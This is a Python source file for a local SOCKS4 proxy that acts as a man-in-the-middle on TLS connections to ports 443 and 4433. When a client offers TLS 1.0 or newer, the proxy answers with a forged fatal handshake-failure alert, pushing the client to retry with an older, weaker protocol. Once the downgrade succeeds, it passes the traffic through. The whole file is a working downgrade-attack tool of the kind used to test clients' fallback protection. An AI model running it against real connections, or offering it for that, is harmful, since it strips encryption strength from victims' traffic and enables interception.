import socketserver
import socket
import select
import os

from tls import Message, build_fatal_alert, AlertDescription
from tls import ContentType, HandshakeType, CipherSuite, ProtocolVersion

MAX = 8192

# transform functions take the from-local and from-remote data,
# and return the to-local and to-remote data, plus the next transform

def tls_mitm_transform(from_front, from_back):
    if from_front:
        m = Message.decode(from_front)
        if m.type == ContentType.Handshake and m.body.type == HandshakeType.ClientHello:
            print('message version:', ProtocolVersion.tostring(m.version))
            print('clienthello max version:', ProtocolVersion.tostring(m.body.body.version))
            print('ciphersuites:', [CipherSuite.lookup(cs) for cs in m.body.body.ciphersuites])
            if m.version >= ProtocolVersion.TLSv1_0:
                print('rejecting handshake to encourage downgrade')
                return bytes(build_fatal_alert(AlertDescription.HandshakeFailure)), None, tls_mitm_transform
            else:
                print('downgrade succeeded, allowing handshake')
                return from_back, from_front, null_transform

    return from_back, from_front, tls_mitm_transform
    
def null_transform(from_front, from_back):
    return from_back, from_front, null_transform

def echo_transform(from_front, from_back):
    return from_front, from_back, echo_transform

class socks_handler(socketserver.BaseRequestHandler):
    def handle_socks_setup(self):
        req = self.request.recv(9)
        ver, cmd, port, ip, nul = req[0], req[1], req[2:4], req[4:8], req[8]
        assert ver == 0x04
        assert cmd == 0x01
        assert nul == 0x00
        
        self.backend_ip = '{0}.{1}.{2}.{3}'.format(*ip)
        self.backend_port = port[0] << 8 | port[1]
        
        print('connect to {0}:{1}'.format(self.backend_ip, self.backend_port))
        self.backend = socket.create_connection((self.backend_ip, self.backend_port))
        print('connected')

        self.request.sendall(bytes([0, 0x5a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]))

    def handle(self):
        print('socks client connected from', self.client_address)
        
        self.handle_socks_setup()

        if self.backend_port in (443, 4433):
            transform = tls_mitm_transform
        else:
            transform = null_transform

        def dispatch(from_front, from_back, transform):
            to_front, to_back, transform = transform(from_front, from_back)
            if to_front:
                print('<-', len(to_front))
                self.request.sendall(to_front)
            if to_back:
                print('->', len(to_back))
                self.backend.sendall(to_back)
            return transform

        try:
            while True:
                r, w, x = select.select([self.backend, self.request],
                                        [],
                                        [self.backend, self.request],
                                        1)

                if x:
                    raise IOError('socket error: {0}'.format(x))

                if self.backend in r:
                    packet = self.backend.recv(MAX)
                    if len(packet) == 0:
                        print('eof from back')
                        break

                    transform = dispatch(None, packet, transform)
                
                if self.request in r:
                    packet = self.request.recv(MAX)
                    if len(packet) == 0:
                        print('eof from front')
                        break

                    transform = dispatch(packet, None, transform)
        except KeyboardInterrupt:
            os._exit(1)
        finally:
            print('closing')
            self.backend.close()
            self.request.close()
        
class RebindTCP(socketserver.ThreadingMixIn, socketserver.TCPServer):
    def __init__(self, *args, **kwargs):
        self.allow_reuse_address = True
        socketserver.TCPServer.__init__(self, *args, **kwargs)

if __name__ == '__main__':
    HOST, PORT = 'localhost', 3355

    server = RebindTCP((HOST, PORT), socks_handler)
    server.serve_forever()
